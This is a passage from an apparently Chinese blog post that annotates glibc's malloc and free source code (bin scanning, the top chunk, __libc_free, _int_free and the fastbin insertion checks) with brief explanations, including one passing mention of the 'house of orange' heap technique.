alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         Search for a chunk by scanning bins, starting with next largest</span></span><br><span class="line"><span class="comment">         bin. This search is strictly by best-fit; i.e., the smallest</span></span><br><span class="line"><span class="comment">         (with ties going to approximately the least recently used) chunk</span></span><br><span class="line"><span class="comment">         that fits is selected.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         The bitmap avoids needing to check that most blocks are nonempty.</span></span><br><span class="line"><span class="comment">         The particular case of skipping all bins during warm-up phases</span></span><br><span class="line"><span class="comment">         when no chunks have been returned yet is faster than it might look.</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"></span><br><span class="line">      ++idx;</span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line">      block = idx2block (idx);</span><br><span class="line">      <span class="built_in">map</span> = av-&gt;binmap[block];</span><br><span class="line">      bit = idx2bit (idx);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span> (;; )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/* Skip rest of block if there are no more set bits in this block.  */</span></span><br><span class="line">          <span class="keyword">if</span> (bit &gt; <span class="built_in">map</span> || bit == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">do</span></span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="keyword">if</span> (++block &gt;= BINMAPSIZE) <span class="comment">/* out of bins */</span></span><br><span class="line">                    <span class="keyword">goto</span> use_top;</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="keyword">while</span> ((<span class="built_in">map</span> = av-&gt;binmap[block]) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">              bin = bin_at (av, (block &lt;&lt; BINMAPSHIFT));</span><br><span class="line">              bit = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Advance to bin with set bit. There must be one. */</span></span><br><span class="line">          <span class="keyword">while</span> ((bit &amp; <span class="built_in">map</span>) == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">              bin = next_bin (bin);</span><br><span class="line">              bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">              assert (bit != <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Inspect the bin. It is likely to be non-empty */</span></span><br><span class="line">          victim = last (bin);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/*  If a false alarm (empty bin), clear the bit. */</span></span><br><span class="line">          <span class="keyword">if</span> (victim == bin)</span><br><span class="line">            &#123;</span><br><span class="line">              av-&gt;binmap[block] = <span class="built_in">map</span> &amp;= ~bit; <span class="comment">/* Write through */</span></span><br><span class="line">              bin = next_bin (bin);</span><br><span class="line">              bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">              <span class="comment">/*  We know the first chunk in this bin is big enough to use. */</span></span><br><span class="line">              assert ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb));</span><br><span class="line"></span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* unlink */</span></span><br><span class="line">              unlink_chunk (av, victim);</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* Exhaust */</span></span><br><span class="line">              <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">                &#123;</span><br><span class="line">                  set_inuse_bit_at_offset (victim, size);</span><br><span class="line">                  <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">		    set_non_main_arena (victim);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* Split */</span></span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                  remainder = chunk_at_offset (victim, nb);</span><br><span class="line"></span><br><span class="line">                  <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                     have to perform a complete insert here.  */</span></span><br><span class="line">                  bck = unsorted_chunks (av);</span><br><span class="line">                  fwd = bck-&gt;fd;</span><br><span class="line">		  <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">		    malloc_printerr (<span class="string">"malloc(): corrupted unsorted chunks 2"</span>);</span><br><span class="line">                  remainder-&gt;bk = bck;</span><br><span class="line">                  remainder-&gt;fd = fwd;</span><br><span class="line">                  bck-&gt;fd = remainder;</span><br><span class="line">                  fwd-&gt;bk = remainder;</span><br><span class="line"></span><br><span class="line">                  <span class="comment">/* advertise as last remainder */</span></span><br><span class="line">                  <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">                    av-&gt;last_remainder = remainder;</span><br><span class="line">                  <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                    &#123;</span><br><span class="line">                      remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                      remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                  set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">                  set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">                  set_foot (remainder, remainder_size);</span><br><span class="line">                &#125;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>largebin部分,依照smallest-first,best-fit原则寻找chunk</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">    use_top:</span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         If large enough, split off the chunk bordering the end of memory</span></span><br><span class="line"><span class="comment">         (held in av-&gt;top). Note that this is in accord with the best-fit</span></span><br><span class="line"><span class="comment">         search rule.  In effect, av-&gt;top is treated as larger (and thus</span></span><br><span class="line"><span class="comment">         less well fitting) than any other available chunk since it can</span></span><br><span class="line"><span class="comment">         be extended to be as large as necessary (up to system</span></span><br><span class="line"><span class="comment">         limitations).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         We require that av-&gt;top always exists (i.e., has size &gt;=</span></span><br><span class="line"><span class="comment">         MINSIZE) after initialization, so if it would otherwise be</span></span><br><span class="line"><span class="comment">         exhausted by current request, it is replenished. (The main</span></span><br><span class="line"><span class="comment">         reason for ensuring it exists is that we may need MINSIZE space</span></span><br><span class="line"><span class="comment">         to put in fenceposts in sysmalloc.)</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"></span><br><span class="line">      victim = av-&gt;top;</span><br><span class="line">      size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class="line">        malloc_printerr (<span class="string">"malloc(): corrupted top size"</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">        &#123;</span><br><span class="line">          remainder_size = size - nb;</span><br><span class="line">          remainder = chunk_at_offset (victim, nb);</span><br><span class="line">          av-&gt;top = remainder;</span><br><span class="line">          set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                    (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">          set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line">          <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* When we are using atomic ops to free fast chunks we can get</span></span><br><span class="line"><span class="comment">         here for all block sizes.  */</span></span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">        &#123;</span><br><span class="line">          malloc_consolidate (av);</span><br><span class="line">          <span class="comment">/* restore original bin index */</span></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">            idx = smallbin_index (nb);</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            idx = largebin_index (nb);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">          <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">            alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>如果都不存在的话,则从topchunk进行且切割,若topchunk的大小不符合,则调用sysmalloc,此函数会free掉topchunk,然后申请新的topchunk<code>(house of orange)</code></li>
<li>同时也可以看出来,topchunk其实也是一个chunk</li>
</ul>
<h2 id="libc-free"><a href="#libc-free" class="headerlink" title="__libc_free"></a>__libc_free</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">__libc_free (<span class="keyword">void</span> *mem) <span class="comment">//传入一个指针</span></span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  mchunkptr p;                          <span class="comment">/* chunk corresponding to mem */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> (*hook) (<span class="keyword">void</span> *, <span class="keyword">const</span> <span class="keyword">void</span> *)<span class="comment">//free_hook</span></span><br><span class="line">    = atomic_forced_read (__free_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      (*hook)(mem, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mem == <span class="number">0</span>)                              <span class="comment">/* free(0) has no effect */</span></span><br><span class="line">    <span class="keyword">return</span>;<span class="comment">//free一个0的时候直接return</span></span><br><span class="line"></span><br><span class="line">  p = mem2chunk (mem);<span class="comment">//将数据指针转换成chunk指针</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (chunk_is_mmapped (p))                       <span class="comment">/* release mmapped memory. */</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* See if the dynamic brk/mmap threshold needs adjusting.</span></span><br><span class="line"><span class="comment">	 Dumped fake mmapped chunks do not affect the threshold.  */</span></span><br><span class="line">      <span class="keyword">if</span> (!mp_.no_dyn_threshold</span><br><span class="line">          &amp;&amp; chunksize_nomask (p) &gt; mp_.mmap_threshold</span><br><span class="line">          &amp;&amp; chunksize_nomask (p) &lt;= DEFAULT_MMAP_THRESHOLD_MAX</span><br><span class="line">	  &amp;&amp; !DUMPED_MAIN_ARENA_CHUNK (p))</span><br><span class="line">        &#123;</span><br><span class="line">          mp_.mmap_threshold = chunksize (p);</span><br><span class="line">          mp_.trim_threshold = <span class="number">2</span> * mp_.mmap_threshold;</span><br><span class="line">          LIBC_PROBE (memory_mallopt_free_dyn_thresholds, <span class="number">2</span>,</span><br><span class="line">                      mp_.mmap_threshold, mp_.trim_threshold);</span><br><span class="line">        &#125;</span><br><span class="line">      munmap_chunk (p);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line"></span><br><span class="line">  ar_ptr = arena_for_chunk (p);</span><br><span class="line">  _int_free (ar_ptr, p, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>后续的部分就简写一下了,因为原理都差不多</li>
<li>这里没什么好说的,类似malloc,先检测free hook是否为空,将数据指针转成chunk指针,<code>free(0)</code>时的事情,最后根据是否为mmap的情况决定是否调用_int_free,一般正常的都会直接调用intfree</li>
<li>记住传入的参数,arena的指针,chunk指针和一个0</li>
</ul>
<h2 id="int-free"><a href="#int-free" class="headerlink" title="__int_free"></a>__int_free</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">_int_free (mstate av, mchunkptr p, <span class="keyword">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">  INTERNAL_SIZE_T size;        <span class="comment">/* its size */</span></span><br><span class="line">  mfastbinptr *fb;             <span class="comment">/* associated fastbin */</span></span><br><span class="line">  mchunkptr nextchunk;         <span class="comment">/* next contiguous chunk */</span></span><br><span class="line">  INTERNAL_SIZE_T nextsize;    <span class="comment">/* its size */</span></span><br><span class="line">  <span class="keyword">int</span> nextinuse;               <span class="comment">/* true if nextchunk is used */</span></span><br><span class="line">  INTERNAL_SIZE_T prevsize;    <span class="comment">/* size of previous contiguous chunk */</span></span><br><span class="line">  mchunkptr bck;               <span class="comment">/* misc temp for linking */</span></span><br><span class="line">  mchunkptr fwd;               <span class="comment">/* misc temp for linking */</span></span><br><span class="line"></span><br><span class="line">  size = chunksize (p);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Little security check which won't hurt performance: the</span></span><br><span class="line"><span class="comment">     allocator never wrapps around at the end of the address space.</span></span><br><span class="line"><span class="comment">     Therefore we can exclude some size values which might appear</span></span><br><span class="line"><span class="comment">     here by accident or by "design" from some intruder.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect ((<span class="keyword">uintptr_t</span>) p &gt; (<span class="keyword">uintptr_t</span>) -size, <span class="number">0</span>)</span><br><span class="line">      || __builtin_expect (misaligned_chunk (p), <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">"free(): invalid pointer"</span>);</span><br><span class="line">  <span class="comment">/* We know that each chunk is at least MINSIZE bytes in size or a</span></span><br><span class="line"><span class="comment">     multiple of MALLOC_ALIGNMENT.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))</span><br><span class="line">    malloc_printerr (<span class="string">"free(): invalid size"</span>);</span><br><span class="line"></span><br><span class="line">  check_inuse_chunk(av, p);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">size_t</span> tc_idx = csize2tidx (size);</span><br><span class="line">    <span class="keyword">if</span> (tcache != <span class="literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">      &#123;</span><br><span class="line">	<span class="comment">/* Check to see if it's already in the tcache.  */</span></span><br><span class="line">	tcache_entry *e = (tcache_entry *) chunk2mem (p);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* This test succeeds on double free.  However, we don't 100%</span></span><br><span class="line"><span class="comment">	   trust it (it also matches random payload data at a 1 in</span></span><br><span class="line"><span class="comment">	   2^&lt;size_t&gt; chance), so verify it's not an unlikely</span></span><br><span class="line"><span class="comment">	   coincidence before aborting.  */</span></span><br><span class="line">	<span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache))</span><br><span class="line">	  &#123;</span><br><span class="line">	    tcache_entry *tmp;</span><br><span class="line">	    LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">	    <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line">		 tmp;</span><br><span class="line">		 tmp = tmp-&gt;next)</span><br><span class="line">	      <span class="keyword">if</span> (tmp == e)</span><br><span class="line">		malloc_printerr (<span class="string">"free(): double free detected in tcache 2"</span>);</span><br><span class="line">	    <span class="comment">/* If we get here, it was a coincidence.  We've wasted a</span></span><br><span class="line"><span class="comment">	       few cycles, but don't abort.  */</span></span><br><span class="line">	  &#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">	  &#123;</span><br><span class="line">	    tcache_put (p, tc_idx);</span><br><span class="line">	    <span class="keyword">return</span>;</span><br><span class="line">	  &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    If eligible, place chunk on a fastbin so it can be found</span></span><br><span class="line"><span class="comment">    and used quickly in malloc.</span></span><br><span class="line"><span class="comment">  */</span></span><br></pre></td></tr></table></figure>

<ul>
<li>可以看到参数,一开始传入的0是lock,其余的都和malloc差不多,后面的是检测是指针否溢出,size是否符合标准</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(get_max_fast ())</span><br><span class="line"></span><br><span class="line">#<span class="keyword">if</span> TRIM_FASTBINS</span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">	If TRIM_FASTBINS set, don't place chunks</span></span><br><span class="line"><span class="comment">	bordering top into fastbins</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">      &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)</span><br><span class="line">#endif</span><br><span class="line">      ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunksize_nomask (chunk_at_offset (p, size))</span><br><span class="line">			  &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">	|| __builtin_expect (chunksize (chunk_at_offset (p, size))</span><br><span class="line">			     &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">	<span class="keyword">bool</span> fail = <span class="literal">true</span>;</span><br><span class="line">	<span class="comment">/* We might not have a lock at this point and concurrent modifications</span></span><br><span class="line"><span class="comment">	   of system_mem might result in a false positive.  Redo the test after</span></span><br><span class="line"><span class="comment">	   getting the lock.  */</span></span><br><span class="line">	<span class="keyword">if</span> (!have_lock)</span><br><span class="line">	  &#123;</span><br><span class="line">	    __libc_lock_lock (av-&gt;mutex);</span><br><span class="line">	    fail = (chunksize_nomask (chunk_at_offset (p, size)) &lt;= <span class="number">2</span> * SIZE_SZ</span><br><span class="line">		    || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem);</span><br><span class="line">	    __libc_lock_unlock (av-&gt;mutex);</span><br><span class="line">	  &#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (fail)</span><br><span class="line">	  malloc_printerr (<span class="string">"free(): invalid next size (fast)"</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    free_perturb (chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br><span class="line"></span><br><span class="line">    atomic_store_relaxed (&amp;av-&gt;have_fastchunks, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> idx = fastbin_index(size);</span><br><span class="line">    fb = &amp;fastbin (av, idx);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */</span></span><br><span class="line">    mchunkptr old = *fb, old2;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">      &#123;</span><br><span class="line">	<span class="comment">/* Check that the top of the bin is not the record we are going to</span></span><br><span class="line"><span class="comment">	   add (i.e., double free).  */</span></span><br><span class="line">	<span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">	  malloc_printerr (<span class="string">"double free or corruption (fasttop)"</span>);</span><br><span class="line">	p-&gt;fd = old;</span><br><span class="line">	*fb = p;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="comment">/* Check that the top of the bin is not the record we are going to</span></span><br><span class="line"><span class="comment">	     add (i.e., double free).  */</span></span><br><span class="line">	  <span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">	    malloc_printerr (<span class="string">"double free or corruption (fasttop)"</span>);</span><br><span class="line">	  p-&gt;fd = old2 = old;</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="keyword">while</span> ((old = catomic_compare_and_exchange_val_rel (fb, p, old2))</span><br><span class="line">	     != old2);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check that size of fastbin chunk at the top is the same as</span></span><br><span class="line"><span class="comment">       size of the chunk that we are adding.  We can dereference OLD</span></span><br><span class="line"><span class="comment">       only if we have the lock, otherwise it might have already been</span></span><br><span class="line"><span class="comment">       allocated again.  */</span></span><br><span class="line">    <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span></span><br><span class="line">	&amp;&amp; __builtin_expect (fastbin_index (chunksize (old)) != idx, <span class="number">0</span>))</span><br><span class="line">      malloc_printerr (<span class="string">"invalid fastbin entry (free)"</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>当size小于max fast size的时候,检测nextchunk是否为top,非top的时候则继续进行代码块的代码</li>
<li>后边是一些锁的操作,这些以后再分析,过了这里就是一个单链表插入表头的操作</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span 